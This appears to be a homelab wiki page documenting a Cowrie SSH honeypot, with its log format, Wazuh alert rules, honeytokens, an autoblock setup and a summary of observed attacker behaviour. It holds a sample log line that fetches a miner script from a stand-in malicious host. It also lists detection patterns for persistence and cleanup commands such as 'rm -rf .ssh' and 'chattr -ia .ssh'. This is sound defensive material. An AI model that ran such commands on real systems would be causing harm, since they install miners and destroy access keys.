# Cowrie Honeypot

> Medium-to-high interaction SSH honeypot running on fuji. Port 22 is intentionally exposed to the public internet — all connections are captured honeypot sessions, not real SSH.

---

## What is a Honeypot?

A **honeypot** is a deliberately exposed system placed to attract attackers. The goal is not to stop them — it's to **observe them**. By analysing what attackers do inside, you can:

- Understand real-world attack techniques and tooling
- Extract attacker infrastructure (IPs, C2 servers, malware samples)
- Practise threat analysis and detection engineering
- Build alerting rules based on real attack patterns

In a SOC context, honeypots are **deception technology** — a proactive control that generates high-fidelity intelligence.

---

## Why Cowrie?

Cowrie is one of the most widely deployed SSH honeypots. It:

- Accepts **any** username/password combination (attackers believe they've broken in)
- Emulates a fake Linux shell — commands run in a sandboxed fake environment
- Logs **everything**: keystrokes, commands, uploaded files, downloaded malware, session metadata
- Outputs structured **JSON logs** — easy to parse and feed into Wazuh/Grafana

---

## Deployment on fuji

| Setting | Value |
|---------|-------|
| Listening port | 22 (IPv4 + IPv6, public) |
| Real SSH | 2233 (Tailscale only, UFW enforced) |
| Fake hostname shown to attackers | `fuji` |
| Activation | `cowrie.socket` + `cowrie.service` (systemd, UID 999) |
| Log format | JSON (`output_jsonlog`) |
| Log path | `/home/cowrie/cowrie/var/log/cowrie/cowrie.json` |
| Log rotation | Daily — `cowrie.json.YYYY-MM-DD` (retained from at least 2026-04-02) |
| Install root | `/home/cowrie/cowrie/` |
| Config | `/home/cowrie/cowrie/etc/cowrie.cfg` |

---

## Log Structure

Each event is a JSON object on its own line (JSONL format). Common event types:

| `eventid` | Meaning |
|-----------|---------|
| `cowrie.session.connect` | New connection established |
| `cowrie.login.success` | Login accepted (all logins succeed in Cowrie) |
| `cowrie.login.failed` | Login before success phase |
| `cowrie.command.input` | Attacker ran a command |
| `cowrie.command.failed` | Command not found in fake shell |
| `cowrie.session.file_download` | Attacker downloaded a file (potential malware) |
| `cowrie.session.file_upload` | Attacker uploaded a file |
| `cowrie.session.closed` | Connection ended |

### Example log entry

```json
{
  "eventid": "cowrie.command.input",
  "timestamp": "2026-04-02T14:33:21.441Z",
  "session": "abc123def456",
  "src_ip": "45.33.32.156",
  "input": "wget http://malicious.example/miner.sh"
}
```

---

## Wazuh Integration

Cowrie logs are shipped to Wazuh via the fuji agent (ID 007). Events are parsed via syslog. Custom rules 100710–100713 handle different event types.

> **Important:** Rules 100710–100713 are syslog-parsed — Wazuh does not extract `data.srcip` for these events. Source IPs live in `full_log` text only.

### High-signal events — immediate Discord alert

The `wazuh-realtime.service` on argus treats these Cowrie events as immediate (not batched):

| Trigger | Why it matters |
|---------|---------------|
| `cowrie.session.file_upload` | Attacker pushing tools to the fake shell |
| File download with `authorized_keys` in `destfile` | SSH persistence attempt |
| Commands: `redtail`, `authorized_keys`, `chattr -ia .ssh`, `rm -rf .ssh` | Known persistence / cleanup patterns |

Generic login noise, generic command observations, and connection events are batched.

---

## Tooling on fuji

| Path | Description |
|------|-------------|
| `/home/cowrie/cowrie/` | Cowrie installation |
| `/home/cowrie/cowrie/etc/cowrie.cfg` | Main config |
| `/home/cowrie/cowrie/var/log/cowrie/` | Log directory |
| `~/cowrie-ops/` | Custom scripts for log processing |
| `~/cowrie-reports/` | Generated analysis reports |

---

## Recon Stack

The fuji recon stack monitors the attack surface of argus from an external vantage point. It runs every 6 hours via cron.

| Script | Purpose |
|--------|---------|
| `~/recon/monitor.sh` | Orchestrator — runs all scan modules, logs to `~/recon/monitor-cron.log` |
| `~/recon/get-home-ip.sh` | Reads `~/.home_public_ip` pushed by argus `ip-reporter.sh`; warns if stale (>15 min) |
| `~/recon/portscan.sh` | Port scan module |
| `~/recon/webscan.sh` | Web scan module |
| `~/recon/dnsscan.sh` | DNS scan module |

Argus pushes its current public IP to fuji every 5 minutes via `~/bin/ip-reporter.sh` (writes `~/.home_public_ip` on fuji at `troy@100.119.8.6`). The recon stack reads this file as its scan target.

Scan results are pulled back to argus by `~/bin/recon-sync-opensearch.py` every 15 minutes and indexed into OpenSearch (`recon-surface-*` index) for the Grafana "Recon - Attack Surface" dashboard.

---

## Honeytokens

See [[Stacks/Wazuh-Stack]] for full honeytoken details. Summary:

| File | Rule | Level | Alert type |
|------|------|-------|-----------|
| `/root/.aws/credentials` | 100200 | 15 | Immediate Discord 🚨 |
| `/cowrie/.ssh/id_rsa_backup` | 100201 | 15 | Immediate Discord 🚨 |

---

## Real Attack Patterns Observed

From NINGI//LAB Cowrie session analysis:

### GPU / Cryptominer Botnets
- Immediately check for GPU (`lspci`, `nvidia-smi`)
- Download XMRig or similar miner
- Set up cron persistence

### Cloud Agent Killers
- Run `ps aux` and `ls /usr/local/bin/` looking for AWS, GCP, Azure monitoring agents
- Kill them to avoid cloud provider detection

### Coordinated Recon Campaigns
- Large numbers of IPs scanning in short windows
- Systematic credential list attempts
- Follow-up from a different IP after confirming credentials

---

## Security Value for SOC Learning

Cowrie is excellent for practising:

- **Log analysis** — parsing real attacker sessions from structured JSON
- **IOC extraction** — malicious IPs, domains, file hashes, C2 patterns
- **Threat intelligence** — correlating attacker IPs with known infrastructure
- **Detection engineering** — writing Wazuh rules for attack patterns seen in real logs
- **Incident reporting** — writing up attacker TTPs in structured format

---

## Cowrie Autoblock

When an attacker runs a command matching a documented campaign signature, Wazuh active response fires `cowrie-autoblock` on all three agents simultaneously.

| Item | Value |
|------|-------|
| Trigger | Wazuh rule 100704 (`cowrie.command.input`) |
| Agents | 001 (argus), 005 (margo-1), 007 (fuji) |
| Signatures | `/var/lib/cowrie-blocklist/signatures/*.yml` on each host |
| Effect | Attacker IP blocked on all three hosts |
| Log | `/var/log/cowrie-autoblock.log` |
| Deploy | `sudo bash ~/scripts/cowrie-blocklist/deploy-ar.sh` on argus |
| Auto-deploy | ningi-vault post-commit hook fires on `campaign-signatures/` changes |

See [[Stacks/Wazuh-Stack]] for manager config details.

---

## Known Risks / Gotchas

- `fail2ban` can block Tailscale IPs — verify before making SSH changes on fuji
- Real SSH does not bind to Tailscale IP; UFW enforces the restriction instead
- Port 22 (Cowrie) and port 2233 (real SSH) must stay separated
- Do not add unrelated public services to fuji — it's intentionally lightweight

---

## Tags
#homelab #service #cowrie #honeypot #fuji #security-research #wazuh
